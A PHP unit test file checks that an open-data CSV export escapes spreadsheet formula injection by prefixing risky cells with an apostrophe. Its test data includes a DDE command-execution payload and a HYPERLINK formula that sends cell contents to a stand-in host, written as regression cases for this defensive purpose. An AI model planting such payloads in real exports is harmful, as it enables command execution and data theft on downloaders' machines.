<?php

namespace Tests\Unit;

use App\Http\Controllers\Public\OpenDataController;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;
use ReflectionMethod;

/**
 * Regression tests for CSV formula injection in the public open-data exports.
 *
 * The institution and business CSVs are downloadable without authentication and
 * contain enumerator-entered free text. Excel, LibreOffice and Sheets execute a
 * cell that begins with = + - @ or a control character, so an institution named
 * =cmd|'/c calc'!A1 would run on the downloader's machine. csvSafe() prefixes an
 * apostrophe, which those applications strip on display but never evaluate.
 */
class CsvInjectionTest extends TestCase
{
    private function csvSafe(?string $value): string
    {
        // csvSafe is private by design; reflection keeps the test on the real
        // implementation rather than a copy that could drift from it.
        return (new ReflectionMethod(OpenDataController::class, 'csvSafe'))->invoke(null, $value);
    }

    #[DataProvider('dangerousValues')]
    public function test_formula_triggers_are_neutralised(string $input): void
    {
        $result = $this->csvSafe($input);

        $this->assertSame("'".$input, $result);
        $this->assertStringStartsWith("'", $result, 'Cell must not begin with a formula trigger.');
    }

    public static function dangerousValues(): array
    {
        return [
            'equals' => ['=1+1'],
            'plus' => ['+1+1'],
            'minus' => ['-1+1'],
            'at sign' => ['@SUM(A1:A9)'],
            'tab' => ["\tcmd"],
            'carriage return' => ["\rcmd"],
            'DDE command execution' => ["=cmd|'/c calc'!A1"],
            'hyperlink exfiltration' => ['=HYPERLINK("http://evil.test?d="&A1,"click")'],
        ];
    }

    #[DataProvider('safeValues')]
    public function test_ordinary_values_pass_through_untouched(?string $input, string $expected): void
    {
        $this->assertSame($expected, $this->csvSafe($input));
    }

    public static function safeValues(): array
    {
        return [
            'devanagari name' => ['श्री जनता माध्यमिक विद्यालय', 'श्री जनता माध्यमिक विद्यालय'],
            'plain ascii' => ['Janata School', 'Janata School'],
            'digits' => ['2081', '2081'],
            'date' => ['2081-04-15', '2081-04-15'],
            'empty string' => ['', ''],
            'null' => [null, ''],
            'internal equals' => ['A=B', 'A=B'],
            'internal hyphen' => ['Ward-5', 'Ward-5'],
        ];
    }

    /**
     * A negative number is a legitimate value that also starts with a formula
     * trigger. Prefixing is still correct — correctness of the export beats
     * numeric formatting, and losing the cell to a formula is not an option.
     */
    public function test_negative_numbers_are_quoted_rather_than_left_executable(): void
    {
        $this->assertSame("'-42", $this->csvSafe('-42'));
    }
}
